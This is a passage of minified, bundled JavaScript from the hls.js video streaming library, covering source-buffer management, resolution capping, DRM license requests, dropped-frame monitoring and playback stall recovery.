cleanup")),this.mediaSource=null,this.media=null,this._objectUrl=null,this.pendingTracks={},this.tracks={},this.sourceBuffer={},this.flushRange=[],this.segments=[],this.appended=0}this.onmso=this.onmse=this.onmsc=null,this.hls.trigger(a.default.MEDIA_DETACHED)},r.prototype.onMediaSourceOpen=function(){o.logger.log("media source opened"),this.hls.trigger(a.default.MEDIA_ATTACHED,{media:this.media});var e=this.mediaSource;e&&e.removeEventListener("sourceopen",this.onmso),this.checkPendingTracks()},r.prototype.checkPendingTracks=function(){var e=this.bufferCodecEventsExpected,t=this.pendingTracks,r=Object.keys(t).length;(r&&!e||2===r)&&(this.createSourceBuffers(t),this.pendingTracks={},this.doAppending())},r.prototype.onMediaSourceClose=function(){o.logger.log("media source closed")},r.prototype.onMediaSourceEnded=function(){o.logger.log("media source ended")},r.prototype.onSBUpdateEnd=function(){if(this.audioTimestampOffset){var e=this.sourceBuffer.audio;o.logger.warn("change mpeg audio timestamp offset from "+e.timestampOffset+" to "+this.audioTimestampOffset),e.timestampOffset=this.audioTimestampOffset,delete this.audioTimestampOffset}this._needsFlush&&this.doFlush(),this._needsEos&&this.checkEos(),this.appending=!1;var t=this.parent,r=this.segments.reduce(function(e,r){return r.parent===t?e+1:e},0),i={},n=this.sourceBuffer;for(var s in n)i[s]=n[s].buffered;this.hls.trigger(a.default.BUFFER_APPENDED,{parent:t,pending:r,timeRanges:i}),this._needsFlush||this.doAppending(),this.updateMediaElementDuration(),0===r&&this.flushLiveBackBuffer()},r.prototype.onSBUpdateError=function(e){o.logger.error("sourceBuffer error:",e),this.hls.trigger(a.default.ERROR,{type:u.ErrorTypes.MEDIA_ERROR,details:u.ErrorDetails.BUFFER_APPENDING_ERROR,fatal:!1})},r.prototype.onBufferReset=function(){var e=this.sourceBuffer;for(var t in e){var r=e[t];try{this.mediaSource.removeSourceBuffer(r),r.removeEventListener("updateend",this.onsbue),r.removeEventListener("error",this.onsbe)}catch(e){}}this.sourceBuffer={},this.flushRange=[],this.segments=[],this.appended=0},r.prototype.onBufferCodecs=function(e){var t=this;if(!Object.keys(this.sourceBuffer).length){Object.keys(e).forEach(function(r){t.pendingTracks[r]=e[r]});var r=this.mediaSource;this.bufferCodecEventsExpected=Math.max(this.bufferCodecEventsExpected-1,0),r&&"open"===r.readyState&&this.checkPendingTracks()}},r.prototype.createSourceBuffers=function(e){var t=this.sourceBuffer,r=this.mediaSource;for(var i in e)if(!t[i]){var n=e[i],s=n.levelCodec||n.codec,l=n.container+";codecs="+s;o.logger.log("creating sourceBuffer("+l+")");try{var c=t[i]=r.addSourceBuffer(l);c.addEventListener("updateend",this.onsbue),c.addEventListener("error",this.onsbe),this.tracks[i]={codec:s,container:n.container},n.buffer=c}catch(e){o.logger.error("error while trying to add sourceBuffer:"+e.message),this.hls.trigger(a.default.ERROR,{type:u.ErrorTypes.MEDIA_ERROR,details:u.ErrorDetails.BUFFER_ADD_CODEC_ERROR,fatal:!1,err:e,mimeType:l})}}this.hls.trigger(a.default.BUFFER_CREATED,{tracks:e})},r.prototype.onBufferAppending=function(e){this._needsFlush||(this.segments?this.segments.push(e):this.segments=[e],this.doAppending())},r.prototype.onBufferAppendFail=function(e){o.logger.error("sourceBuffer error:",e.event),this.hls.trigger(a.default.ERROR,{type:u.ErrorTypes.MEDIA_ERROR,details:u.ErrorDetails.BUFFER_APPENDING_ERROR,fatal:!1})},r.prototype.onBufferEos=function(e){var t=this.sourceBuffer,r=e.type;for(var i in t)r&&i!==r||t[i].ended||(t[i].ended=!0,o.logger.log(i+" sourceBuffer now EOS"));this.checkEos()},r.prototype.checkEos=function(){var e=this.sourceBuffer,t=this.mediaSource;if(t&&"open"===t.readyState){for(var r in e){var i=e[r];if(!i.ended)return;if(i.updating)return void(this._needsEos=!0)}o.logger.log("all media data are available, signal endOfStream() to MediaSource and stop loading fragment");try{t.endOfStream()}catch(e){o.logger.warn("exception while calling mediaSource.endOfStream()")}this._needsEos=!1}else this._needsEos=!1},r.prototype.onBufferFlushing=function(e){this.flushRange.push({start:e.startOffset,end:e.endOffset,type:e.type}),this.flushBufferCounter=0,this.doFlush()},r.prototype.flushLiveBackBuffer=function(){if(this._live){var e=this.hls.config.liveBackBufferLength;if(isFinite(e)&&!(e<0))for(var t=this.media.currentTime,r=this.sourceBuffer,i=Object.keys(r),n=t-Math.max(e,this._levelTargetDuration),a=i.length-1;a>=0;a--){var s=i[a],o=r[s].buffered;o.length>0&&n>o.start(0)&&this.removeBufferRange(s,r[s],0,n)}}},r.prototype.onLevelUpdated=function(e){var t=e.details;t.fragments.length>0&&(this._levelDuration=t.totalduration+t.fragments[0].start,this._levelTargetDuration=t.averagetargetduration||t.targetduration||10,this._live=t.live,this.updateMediaElementDuration())},r.prototype.updateMediaElementDuration=function(){var t,r=this.hls.config;if(null!==this._levelDuration&&this.media&&this.mediaSource&&this.sourceBuffer&&0!==this.media.readyState&&"open"===this.mediaSource.readyState){for(var i in this.sourceBuffer)if(!0===this.sourceBuffer[i].updating)return;t=this.media.duration,null===this._msDuration&&(this._msDuration=this.mediaSource.duration),!0===this._live&&!0===r.liveDurationInfinity?(o.logger.log("Media Source duration is set to Infinity"),this._msDuration=this.mediaSource.duration=1/0):(this._levelDuration>this._msDuration&&this._levelDuration>t||!e.isFinite(t))&&(o.logger.log("Updating Media Source duration to "+this._levelDuration.toFixed(3)),this._msDuration=this.mediaSource.duration=this._levelDuration)}},r.prototype.doFlush=function(){for(;this.flushRange.length;){var e=this.flushRange[0];if(!this.flushBuffer(e.start,e.end,e.type))return void(this._needsFlush=!0);this.flushRange.shift(),this.flushBufferCounter=0}if(0===this.flushRange.length){this._needsFlush=!1;var t=0,r=this.sourceBuffer;try{for(var i in r)t+=r[i].buffered.length}catch(e){o.logger.error("error while accessing sourceBuffer.buffered")}this.appended=t,this.hls.trigger(a.default.BUFFER_FLUSHED)}},r.prototype.doAppending=function(){var e=this.hls,t=this.segments,r=this.sourceBuffer;if(Object.keys(r).length){if(this.media.error)return this.segments=[],void o.logger.error("trying to append although a media error occured, flush segment and abort");if(this.appending)return;if(t&&t.length){var i=t.shift();try{var n=r[i.type];n?n.updating?t.unshift(i):(n.ended=!1,this.parent=i.parent,n.appendBuffer(i.data),this.appendError=0,this.appended++,this.appending=!0):this.onSBUpdateEnd()}catch(r){o.logger.error("error while trying to append buffer:"+r.message),t.unshift(i);var s={type:u.ErrorTypes.MEDIA_ERROR,parent:i.parent};22!==r.code?(this.appendError?this.appendError++:this.appendError=1,s.details=u.ErrorDetails.BUFFER_APPEND_ERROR,this.appendError>e.config.appendErrorMaxRetry?(o.logger.log("fail "+e.config.appendErrorMaxRetry+" times to append segment in sourceBuffer"),this.segments=[],s.fatal=!0,e.trigger(a.default.ERROR,s)):(s.fatal=!1,e.trigger(a.default.ERROR,s))):(this.segments=[],s.details=u.ErrorDetails.BUFFER_FULL_ERROR,s.fatal=!1,e.trigger(a.default.ERROR,s))}}}},r.prototype.flushBuffer=function(e,t,r){var i,n=this.sourceBuffer;if(Object.keys(n).length){if(o.logger.log("flushBuffer,pos/start/end: "+this.media.currentTime.toFixed(3)+"/"+e+"/"+t),this.flushBufferCounter<this.appended){for(var a in n)if(!r||a===r){if((i=n[a]).ended=!1,i.updating)return o.logger.warn("cannot flush, sb updating in progress"),!1;if(this.removeBufferRange(a,i,e,t))return this.flushBufferCounter++,!1}}else o.logger.warn("abort flushing too many retries");o.logger.log("buffer flushed")}return!0},r.prototype.removeBufferRange=function(e,t,r,i){try{for(var n=0;n<t.buffered.length;n++){var a=t.buffered.start(n),s=t.buffered.end(n),u=Math.max(a,r),l=Math.min(s,i);if(Math.min(l,s)-u>.5)return o.logger.log("sb remove "+e+" ["+u+","+l+"], of ["+a+","+s+"], pos:"+this.media.currentTime),t.remove(u,l),!0}}catch(e){o.logger.warn("removeBufferRange failed",e)}return!1},r}(s.default);t.default=c}).call(this,r("./src/polyfills/number.js").Number)},"./src/controller/cap-level-controller.js":function(e,t,r){"use strict";(function(e){var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=r("./src/events.js"),s=function(t){function r(r){var i=t.call(this,r,a.default.FPS_DROP_LEVEL_CAPPING,a.default.MEDIA_ATTACHING,a.default.MANIFEST_PARSED,a.default.BUFFER_CODECS,a.default.MEDIA_DETACHING)||this;return i.autoLevelCapping=e.POSITIVE_INFINITY,i.firstLevel=null,i.levels=[],i.media=null,i.restrictedLevels=[],i.timer=null,i}return n(r,t),r.prototype.destroy=function(){this.hls.config.capLevelToPlayerSize&&(this.media=null,this._stopCapping())},r.prototype.onFpsDropLevelCapping=function(e){r.isLevelAllowed(e.droppedLevel,this.restrictedLevels)&&this.restrictedLevels.push(e.droppedLevel)},r.prototype.onMediaAttaching=function(e){this.media=e.media instanceof window.HTMLVideoElement?e.media:null},r.prototype.onManifestParsed=function(e){var t=this.hls;this.restrictedLevels=[],this.levels=e.levels,this.firstLevel=e.firstLevel,t.config.capLevelToPlayerSize&&e.video&&this._startCapping()},r.prototype.onBufferCodecs=function(e){this.hls.config.capLevelToPlayerSize&&e.video&&this._startCapping()},r.prototype.onLevelsUpdated=function(e){this.levels=e.levels},r.prototype.onMediaDetaching=function(){this._stopCapping()},r.prototype.detectPlayerSize=function(){if(this.media){var e=this.levels?this.levels.length:0;if(e){var t=this.hls;t.autoLevelCapping=this.getMaxLevel(e-1),t.autoLevelCapping>this.autoLevelCapping&&t.streamController.nextLevelSwitch(),this.autoLevelCapping=t.autoLevelCapping}}},r.prototype.getMaxLevel=function(e){var t=this;if(!this.levels)return-1;var i=this.levels.filter(function(i,n){return r.isLevelAllowed(n,t.restrictedLevels)&&n<=e});return r.getMaxLevelByMediaSize(i,this.mediaWidth,this.mediaHeight)},r.prototype._startCapping=function(){this.timer||(this.autoLevelCapping=e.POSITIVE_INFINITY,this.hls.firstLevel=this.getMaxLevel(this.firstLevel),clearInterval(this.timer),this.timer=setInterval(this.detectPlayerSize.bind(this),1e3),this.detectPlayerSize())},r.prototype._stopCapping=function(){this.restrictedLevels=[],this.firstLevel=null,this.autoLevelCapping=e.POSITIVE_INFINITY,this.timer&&(this.timer=clearInterval(this.timer),this.timer=null)},Object.defineProperty(r.prototype,"mediaWidth",{get:function(){var e,t=this.media;return t&&(e=t.width||t.clientWidth||t.offsetWidth,e*=r.contentScaleFactor),e},enumerable:!0,configurable:!0}),Object.defineProperty(r.prototype,"mediaHeight",{get:function(){var e,t=this.media;return t&&(e=t.height||t.clientHeight||t.offsetHeight,e*=r.contentScaleFactor),e},enumerable:!0,configurable:!0}),Object.defineProperty(r,"contentScaleFactor",{get:function(){var e=1;try{e=window.devicePixelRatio}catch(e){}return e},enumerable:!0,configurable:!0}),r.isLevelAllowed=function(e,t){return void 0===t&&(t=[]),-1===t.indexOf(e)},r.getMaxLevelByMediaSize=function(e,t,r){if(!e||e&&!e.length)return-1;for(var i,n,a=e.length-1,s=0;s<e.length;s+=1){var o=e[s];if((o.width>=t||o.height>=r)&&(i=o,!(n=e[s+1])||i.width!==n.width||i.height!==n.height)){a=s;break}}return a},r}(r("./src/event-handler.js").default);t.default=s}).call(this,r("./src/polyfills/number.js").Number)},"./src/controller/eme-controller.js":function(e,t,r){"use strict";var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=r("./src/event-handler.js"),s=r("./src/events.js"),o=r("./src/errors.js"),u=r("./src/utils/logger.js"),l=window.XMLHttpRequest,c="com.widevine.alpha",d="com.microsoft.playready",f=function(e){function t(t){var r=e.call(this,t,s.default.MEDIA_ATTACHED,s.default.MANIFEST_PARSED)||this;return r._widevineLicenseUrl=t.config.widevineLicenseUrl,r._licenseXhrSetup=t.config.licenseXhrSetup,r._emeEnabled=t.config.emeEnabled,r._requestMediaKeySystemAccess=t.config.requestMediaKeySystemAccessFunc,r._mediaKeysList=[],r._media=null,r._hasSetMediaKeys=!1,r._isMediaEncrypted=!1,r._requestLicenseFailureCount=0,r}return n(t,e),t.prototype.getLicenseServerUrl=function(e){var t;switch(e){case c:t=this._widevineLicenseUrl;break;default:t=null}return t||(u.logger.error('No license server URL configured for key-system "'+e+'"'),this.hls.trigger(s.default.ERROR,{type:o.ErrorTypes.KEY_SYSTEM_ERROR,details:o.ErrorDetails.KEY_SYSTEM_LICENSE_REQUEST_FAILED,fatal:!0})),t},t.prototype._attemptKeySystemAccess=function(e,t,r){var i=this,n=function(e,t,r){switch(e){case c:return function(e,t,r){var i={videoCapabilities:[]};return t.forEach(function(e){i.videoCapabilities.push({contentType:'video/mp4; codecs="'+e+'"'})}),[i]}(0,r);default:throw Error("Unknown key-system: "+e)}}(e,0,r);n?(u.logger.log("Requesting encrypted media key-system access"),this.requestMediaKeySystemAccess(e,n).then(function(t){i._onMediaKeySystemAccessObtained(e,t)}).catch(function(t){u.logger.error('Failed to obtain key-system "'+e+'" access:',t)})):u.logger.warn("Can not create config for key-system (maybe because platform is not supported):",e)},Object.defineProperty(t.prototype,"requestMediaKeySystemAccess",{get:function(){if(!this._requestMediaKeySystemAccess)throw new Error("No requestMediaKeySystemAccess function configured");return this._requestMediaKeySystemAccess},enumerable:!0,configurable:!0}),t.prototype._onMediaKeySystemAccessObtained=function(e,t){var r=this;u.logger.log('Access for key-system "'+e+'" obtained');var i={mediaKeys:null,mediaKeysSession:null,mediaKeysSessionInitialized:!1,mediaKeySystemAccess:t,mediaKeySystemDomain:e};this._mediaKeysList.push(i),t.createMediaKeys().then(function(t){i.mediaKeys=t,u.logger.log('Media-keys created for key-system "'+e+'"'),r._onMediaKeysCreated()}).catch(function(e){u.logger.error("Failed to create media-keys:",e)})},t.prototype._onMediaKeysCreated=function(){var e=this;this._mediaKeysList.forEach(function(t){t.mediaKeysSession||(t.mediaKeysSession=t.mediaKeys.createSession(),e._onNewMediaKeySession(t.mediaKeysSession))})},t.prototype._onNewMediaKeySession=function(e){var t=this;u.logger.log("New key-system session "+e.sessionId),e.addEventListener("message",function(r){t._onKeySessionMessage(e,r.message)},!1)},t.prototype._onKeySessionMessage=function(e,t){u.logger.log("Got EME message event, creating license request"),this._requestLicense(t,function(t){u.logger.log("Received license data, updating key-session"),e.update(t)})},t.prototype._onMediaEncrypted=function(e,t){u.logger.log('Media is encrypted using "'+e+'" init data type'),this._isMediaEncrypted=!0,this._mediaEncryptionInitDataType=e,this._mediaEncryptionInitData=t,this._attemptSetMediaKeys(),this._generateRequestWithPreferredKeySession()},t.prototype._attemptSetMediaKeys=function(){if(!this._hasSetMediaKeys){var e=this._mediaKeysList[0];if(!e||!e.mediaKeys)return u.logger.error("Fatal: Media is encrypted but no CDM access or no keys have been obtained yet"),void this.hls.trigger(s.default.ERROR,{type:o.ErrorTypes.KEY_SYSTEM_ERROR,details:o.ErrorDetails.KEY_SYSTEM_NO_KEYS,fatal:!0});u.logger.log("Setting keys for encrypted media"),this._media.setMediaKeys(e.mediaKeys),this._hasSetMediaKeys=!0}},t.prototype._generateRequestWithPreferredKeySession=function(){var e=this,t=this._mediaKeysList[0];if(!t)return u.logger.error("Fatal: Media is encrypted but not any key-system access has been obtained yet"),void this.hls.trigger(s.default.ERROR,{type:o.ErrorTypes.KEY_SYSTEM_ERROR,details:o.ErrorDetails.KEY_SYSTEM_NO_ACCESS,fatal:!0});if(t.mediaKeysSessionInitialized)u.logger.warn("Key-Session already initialized but requested again");else{var r=t.mediaKeysSession;r||(u.logger.error("Fatal: Media is encrypted but no key-session existing"),this.hls.trigger(s.default.ERROR,{type:o.ErrorTypes.KEY_SYSTEM_ERROR,details:o.ErrorDetails.KEY_SYSTEM_NO_SESSION,fatal:!0}));var i=this._mediaEncryptionInitDataType,n=this._mediaEncryptionInitData;u.logger.log('Generating key-session request for "'+i+'" init data type'),t.mediaKeysSessionInitialized=!0,r.generateRequest(i,n).then(function(){u.logger.debug("Key-session generation succeeded")}).catch(function(t){u.logger.error("Error generating key-session request:",t),e.hls.trigger(s.default.ERROR,{type:o.ErrorTypes.KEY_SYSTEM_ERROR,details:o.ErrorDetails.KEY_SYSTEM_NO_SESSION,fatal:!1})})}},t.prototype._createLicenseXhr=function(e,t,r){var i=new l,n=this._licenseXhrSetup;try{if(n)try{n(i,e)}catch(t){i.open("POST",e,!0),n(i,e)}i.readyState||i.open("POST",e,!0)}catch(e){return u.logger.error("Error setting up key-system license XHR",e),void this.hls.trigger(s.default.ERROR,{type:o.ErrorTypes.KEY_SYSTEM_ERROR,details:o.ErrorDetails.KEY_SYSTEM_LICENSE_REQUEST_FAILED,fatal:!0})}return i.responseType="arraybuffer",i.onreadystatechange=this._onLicenseRequestReadyStageChange.bind(this,i,e,t,r),i},t.prototype._onLicenseRequestReadyStageChange=function(e,t,r,i){switch(e.readyState){case 4:if(200===e.status)this._requestLicenseFailureCount=0,u.logger.log("License request succeeded"),i(e.response);else{if(u.logger.error("License Request XHR failed ("+t+"). Status: "+e.status+" ("+e.statusText+")"),this._requestLicenseFailureCount++,this._requestLicenseFailureCount<=3){var n=3-this._requestLicenseFailureCount+1;return u.logger.warn("Retrying license request, "+n+" attempts left"),void this._requestLicense(r,i)}this.hls.trigger(s.default.ERROR,{type:o.ErrorTypes.KEY_SYSTEM_ERROR,details:o.ErrorDetails.KEY_SYSTEM_LICENSE_REQUEST_FAILED,fatal:!0})}}},t.prototype._generateLicenseRequestChallenge=function(e,t){var r;return e.mediaKeySystemDomain===d?u.logger.error("PlayReady is not supported (yet)"):e.mediaKeySystemDomain===c?r=t:u.logger.error("Unsupported key-system:",e.mediaKeySystemDomain),r},t.prototype._requestLicense=function(e,t){u.logger.log("Requesting content license for key-system");var r=this._mediaKeysList[0];if(!r)return u.logger.error("Fatal error: Media is encrypted but no key-system access has been obtained yet"),void this.hls.trigger(s.default.ERROR,{type:o.ErrorTypes.KEY_SYSTEM_ERROR,details:o.ErrorDetails.KEY_SYSTEM_NO_ACCESS,fatal:!0});var i=this.getLicenseServerUrl(r.mediaKeySystemDomain),n=this._createLicenseXhr(i,e,t);u.logger.log("Sending license request to URL: "+i),n.send(this._generateLicenseRequestChallenge(r,e))},t.prototype.onMediaAttached=function(e){var t=this;if(this._emeEnabled){var r=e.media;this._media=r,r.addEventListener("encrypted",function(e){t._onMediaEncrypted(e.initDataType,e.initData)})}},t.prototype.onManifestParsed=function(e){if(this._emeEnabled){var t=e.levels.map(function(e){return e.audioCodec}),r=e.levels.map(function(e){return e.videoCodec});this._attemptKeySystemAccess(c,t,r)}},t}(a.default);t.default=f},"./src/controller/fps-controller.js":function(e,t,r){"use strict";var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=r("./src/events.js"),s=r("./src/event-handler.js"),o=r("./src/utils/logger.js"),u=window.performance,l=function(e){function t(t){return e.call(this,t,a.default.MEDIA_ATTACHING)||this}return n(t,e),t.prototype.destroy=function(){this.timer&&clearInterval(this.timer),this.isVideoPlaybackQualityAvailable=!1},t.prototype.onMediaAttaching=function(e){var t=this.hls.config;t.capLevelOnFPSDrop&&("function"==typeof(this.video=e.media instanceof window.HTMLVideoElement?e.media:null).getVideoPlaybackQuality&&(this.isVideoPlaybackQualityAvailable=!0),clearInterval(this.timer),this.timer=setInterval(this.checkFPSInterval.bind(this),t.fpsDroppedMonitoringPeriod))},t.prototype.checkFPS=function(e,t,r){var i=u.now();if(t){if(this.lastTime){var n=i-this.lastTime,s=r-this.lastDroppedFrames,l=t-this.lastDecodedFrames,c=1e3*s/n,d=this.hls;if(d.trigger(a.default.FPS_DROP,{currentDropped:s,currentDecoded:l,totalDroppedFrames:r}),c>0&&s>d.config.fpsDroppedMonitoringThreshold*l){var f=d.currentLevel;o.logger.warn("drop FPS ratio greater than max allowed value for currentLevel: "+f),f>0&&(-1===d.autoLevelCapping||d.autoLevelCapping>=f)&&(f-=1,d.trigger(a.default.FPS_DROP_LEVEL_CAPPING,{level:f,droppedLevel:d.currentLevel}),d.autoLevelCapping=f,d.streamController.nextLevelSwitch())}}this.lastTime=i,this.lastDroppedFrames=r,this.lastDecodedFrames=t}},t.prototype.checkFPSInterval=function(){var e=this.video;if(e)if(this.isVideoPlaybackQualityAvailable){var t=e.getVideoPlaybackQuality();this.checkFPS(e,t.totalVideoFrames,t.droppedVideoFrames)}else this.checkFPS(e,e.webkitDecodedFrameCount,e.webkitDroppedFrameCount)},t}(s.default);t.default=l},"./src/controller/fragment-finders.js":function(e,t,r){"use strict";(function(e){Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/utils/binary-search.js");function n(e,t,r){void 0===e&&(e=0),void 0===t&&(t=0);var i=Math.min(t,r.duration+(r.deltaPTS?r.deltaPTS:0));return r.start+r.duration-i<=e?1:r.start-i>e&&r.start?-1:0}function a(e,t,r){var i=1e3*Math.min(t,r.duration+(r.deltaPTS?r.deltaPTS:0));return r.endProgramDateTime-i>e}t.findFragmentByPDT=function(t,r,i){if(!Array.isArray(t)||!t.length||!e.isFinite(r))return null;if(r<t[0].programDateTime)return null;if(r>=t[t.length-1].endProgramDateTime)return null;i=i||0;for(var n=0;n<t.length;++n){var s=t[n];if(a(r,i,s))return s}return null},t.findFragmentByPTS=function(e,t,r,a){void 0===r&&(r=0),void 0===a&&(a=0);var s=e?t[e.sn-t[0].sn+1]:null;return s&&!n(r,a,s)?s:i.default.search(t,n.bind(null,r,a))},t.fragmentWithinToleranceTest=n,t.pdtWithinToleranceTest=a}).call(this,r("./src/polyfills/number.js").Number)},"./src/controller/fragment-tracker.js":function(e,t,r){"use strict";(function(e){var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=r("./src/event-handler.js"),s=r("./src/events.js");t.FragmentState={NOT_LOADED:"NOT_LOADED",APPENDING:"APPENDING",PARTIAL:"PARTIAL",OK:"OK"};var o=function(r){function i(e){var t=r.call(this,e,s.default.BUFFER_APPENDED,s.default.FRAG_BUFFERED,s.default.FRAG_LOADED)||this;return t.bufferPadding=.2,t.fragments=Object.create(null),t.timeRanges=Object.create(null),t.config=e.config,t}return n(i,r),i.prototype.destroy=function(){this.fragments=Object.create(null),this.timeRanges=Object.create(null),this.config=null,a.default.prototype.destroy.call(this),r.prototype.destroy.call(this)},i.prototype.getBufferedFrag=function(e,t){var r=this.fragments,i=Object.keys(r).filter(function(i){var n=r[i];if(n.body.type!==t)return!1;if(!n.buffered)return!1;var a=n.body;return a.startPTS<=e&&e<=a.endPTS});if(0===i.length)return null;var n=i.pop();return r[n].body},i.prototype.detectEvictedFragments=function(e,t){var r,i,n=this;Object.keys(this.fragments).forEach(function(a){var s=n.fragments[a];if(!0===s.buffered){var o=s.range[e];if(o){r=o.time;for(var u=0;u<r.length;u++)if(i=r[u],!1===n.isTimeBuffered(i.startPTS,i.endPTS,t)){n.removeFragment(s.body);break}}}})},i.prototype.detectPartialFragments=function(e){var t=this,r=this.getFragmentKey(e),i=this.fragments[r];i&&(i.buffered=!0,Object.keys(this.timeRanges).forEach(function(r){if(e.hasElementaryStream(r)){var n=t.timeRanges[r];i.range[r]=t.getBufferedTimes(e.startPTS,e.endPTS,n)}}))},i.prototype.getBufferedTimes=function(e,t,r){for(var i,n,a=[],s=!1,o=0;o<r.length;o++){if(i=r.start(o)-this.bufferPadding,n=r.end(o)+this.bufferPadding,e>=i&&t<=n){a.push({startPTS:Math.max(e,r.start(o)),endPTS:Math.min(t,r.end(o))});break}if(e<n&&t>i)a.push({startPTS:Math.max(e,r.start(o)),endPTS:Math.min(t,r.end(o))}),s=!0;else if(t<=i)break}return{time:a,partial:s}},i.prototype.getFragmentKey=function(e){return e.type+"_"+e.level+"_"+e.urlId+"_"+e.sn},i.prototype.getPartialFragment=function(e){var t,r,i,n=this,a=null,s=0;return Object.keys(this.fragments).forEach(function(o){var u=n.fragments[o];n.isPartial(u)&&(r=u.body.startPTS-n.bufferPadding,i=u.body.endPTS+n.bufferPadding,e>=r&&e<=i&&(t=Math.min(e-r,i-e),s<=t&&(a=u.body,s=t)))}),a},i.prototype.getState=function(e){var r=this.getFragmentKey(e),i=this.fragments[r],n=t.FragmentState.NOT_LOADED;return void 0!==i&&(n=i.buffered?!0===this.isPartial(i)?t.FragmentState.PARTIAL:t.FragmentState.OK:t.FragmentState.APPENDING),n},i.prototype.isPartial=function(e){return!0===e.buffered&&(void 0!==e.range.video&&!0===e.range.video.partial||void 0!==e.range.audio&&!0===e.range.audio.partial)},i.prototype.isTimeBuffered=function(e,t,r){for(var i,n,a=0;a<r.length;a++){if(i=r.start(a)-this.bufferPadding,n=r.end(a)+this.bufferPadding,e>=i&&t<=n)return!0;if(t<=i)return!1}return!1},i.prototype.onFragLoaded=function(t){var r=t.frag;e.isFinite(r.sn)&&!r.bitrateTest&&(this.fragments[this.getFragmentKey(r)]={body:r,range:Object.create(null),buffered:!1})},i.prototype.onBufferAppended=function(e){var t=this;this.timeRanges=e.timeRanges,Object.keys(this.timeRanges).forEach(function(e){var r=t.timeRanges[e];t.detectEvictedFragments(e,r)})},i.prototype.onFragBuffered=function(e){this.detectPartialFragments(e.frag)},i.prototype.hasFragment=function(e){var t=this.getFragmentKey(e);return void 0!==this.fragments[t]},i.prototype.removeFragment=function(e){var t=this.getFragmentKey(e);delete this.fragments[t]},i.prototype.removeAllFragments=function(){this.fragments=Object.create(null)},i}(a.default);t.FragmentTracker=o}).call(this,r("./src/polyfills/number.js").Number)},"./src/controller/gap-controller.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/utils/buffer-helper.js"),n=r("./src/errors.js"),a=r("./src/events.js"),s=r("./src/utils/logger.js"),o=function(){function e(e,t,r,i){this.config=e,this.media=t,this.fragmentTracker=r,this.hls=i,this.stallReported=!1}return e.prototype.poll=function(e,t){var r=this.config,n=this.media,a=n.currentTime,o=window.performance.now();if(a!==e)return this.stallReported&&(s.logger.warn("playback not stuck anymore @"+a+", after "+Math.round(o-this.stalled)+"ms"),this.stallReported=!1),this.stalled=null,void(this.nudgeRetry=0);if(!(n.ended||!n.buffered.length||n.readyState>2||n.seeking&&i.BufferHelper.isBuffered(n,a))){var u=o-this.stalled,l=i.BufferHelper.bufferInfo(n,a,r.maxBufferHole);this.stalled?(u>=1e3&&this._reportStall(l.len),this._tryFixBufferStall(l,u)):this.stalled=o}},e.prototype._tryFixBufferStall=function(e,t){var r=this.config,i=this.fragmentTracker,n=this.media.currentTime,a=i.getPartialFragment(n);a&&this._trySkipBufferHole(a),e.len>.5&&t>1e3*r.highBufferWatchdogPeriod&&(this.stalled=null,this._tryNudgeBuffer())},e.prototype._reportStall=function(e){var t=this.hls,r=this.media;this.stallReported||(this.stallReported=!0,s.logger.warn("Playback stalling at @"+r.currentTime+" due to low buffer"),t.trigger(a.default.ERROR,{type:n.ErrorTypes.MEDIA_ERROR,details:n.ErrorDetails.BUFFER_STALLED_ERROR,fatal:!1,buffer:e}))},e.prototype._trySkipBufferHole=function(e){for(var t=this.hls,r=this.media,i=r.currentTime,o=0,u=0;u<r.buffered.length;u++){var l=r.buffered.start(u);if(i>=o&&i<l)return r.currentTime=Math.max(l,r.currentTime+.1),s.logger.warn("skipping hole, adjusting currentTime from "+i+" to "+r.currentTime),this.stalled=null,void t.trigger(a.default.ERROR,{type:n.ErrorTypes.MEDIA_ERROR,details:n.ErrorDetails.BUFFER_SEEK_OVER_HOLE,fatal:!1,reason:"fragment loaded with buffer holes, seeking from "+i+" to "+r.currentTime,frag:e});o=r.buffered.end(u)}},e.prototype._tryNudgeBuffer=function(){var e=this.config,t=this.hls,r=this.media,i=r.currentTime,o=(this.nudgeRetry||0)+1;if(this.nudgeRetry=o,o<e.nudgeMaxRetry){var u=i+o*e.nudgeOffset;s.logger.log("adjust currentTime from "+i+" to "+u),r.currentTime=u,t.trigger(a.default.ERROR,{type:n.ErrorTypes.MEDIA_ERROR,details:n.ErrorDetails.BUFFER_NUDGE_ON_STALL,fatal:!1})}else s.logger.error("still stuck in high buffer @"+i+" after "+e.nudgeMaxRetry+", raise fatal error"),t.trigger(a.default.ERROR,{type:n.ErrorTypes.MEDIA_ERROR,details:n.ErrorDetails.BUFFER_STALLED_ERROR,fatal:!0})},e}();t.default=o},"./src/controller/id3-track-controller.js":function(e,t,r){"use strict";var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var 